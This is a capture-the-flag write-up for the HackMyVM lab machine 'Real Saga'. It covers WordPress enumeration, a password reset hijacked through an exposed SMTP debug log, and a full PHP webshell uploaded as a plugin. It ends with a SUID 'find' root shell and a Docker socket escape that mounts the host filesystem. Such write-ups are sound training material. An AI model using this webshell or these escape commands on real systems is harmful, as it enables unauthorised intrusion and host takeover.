# Real Saga: A HackMyVM Machine

Difficulty: Medium

## Enumeration
- Through nmap, port 25,80 were found to be open.

### Wordpress App Enumeration

- The app was mainly hosted on the hostname `saga.local`, on looking through the webpage, there was another vhost `netwire.local`, so both were added to **/etc/hosts**.
- There was directory listing enabled on the app, meaning we could see files and folders listed.
- On running *nuclei* on the app, the app was vulnerable to 2 CVEs

```
[CVE-2023-5561] [http] [medium] http://saga.local/?rest_route=/wp/v2/users&search=@ [route="?rest_route=/wp/v2/users&"]
[CVE-2020-35234] [http] [high] http://saga.local/wp-content/plugins/easy-wp-smtp/
```

- easy-wp-smtp is vulnerable to the debug log exposure, which we can find in this link: http://saga.local/wp-content/uploads/2024/08/log_file_2024-08-16__03-39-29.txt
- We can see 3 potential admin emails here, namely root@saga.local, admin@saga.local and admin@netwire.local
- We can also see the emails that are sent and received, meaning we can reset the admin account password by reading the emails from here.
- So let's navigate to /wp-login.php and use the password reset functionality. Here, I found that entering `admin@netwire.local` worked.
- From the debug log, copy and paste the password reset link and reset the password. I reset it to `test`.

### Initial Foothold

- Since we have access to the admin panel, we can upload plugins to the website. So I will create a simple webshell plugin and upload it.
- PHP Webshell Code:

```php
<?php
/*
Plugin Name: Webshell
Description: Do I need to explain>
Version: 1.0
Author: You're Hacked
Author URI: saga.local
License: GPL2
License URI: www.gnu.org
Text Domain: my-webshell
Domain Path: /my-webshell
*/

if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mini WebShell</title>
</head>
<body>
    <h2>PHP WebShell</h2>
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" size="50">
        <input type="submit" value="Execute">
    </form>

    <?php if (isset($output)): ?>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
</body>
</html>
```

- To upload this, I first zipped this into an archive called `webshell.zip` and used the upload plugin functionality to add it in. Check the http://saga.local/wp-content/plugins endpoint to find the upload location of your plugin.

```bash
zip webshell.zip webshell.php
```

- Use this to spawn a reverse shell of your choice.

## User flag

- We gain a reverse shell as www-data. Just navigate to **/home/dev/user.txt** and get the user flag.

## Privilege Escalation

- On running linpeas.sh we can see that we are in a docker container, and that docker.sock is mounted, however we are not able to run the docker command.
- This is because the docker.sock file in */run* is not recognized as a socket. 
- However we can see another file in */run* called `docker.saga`. This is a docker socket. So we will use this to break out of the docker container.

- We also see that the `find` binary has the suid bit set, so we can use this to escalate privileges to container root.

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

- After gaining the root shell, we will break out of the docker container using the following commands: 

```bash
docker -H unix:///run/docker.saga images (This uses the custom socket to run docker)
docker -H unix:///run/docker.saga run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash (This runs docker with the host filesystem mounted. So I can read root.txt)
```

- After running these 2 commands, you should be in another docker container as root. This container has the host filesystem mounted on it. So we will use this to read `/root/root.txt`.


Happy Hacking :)
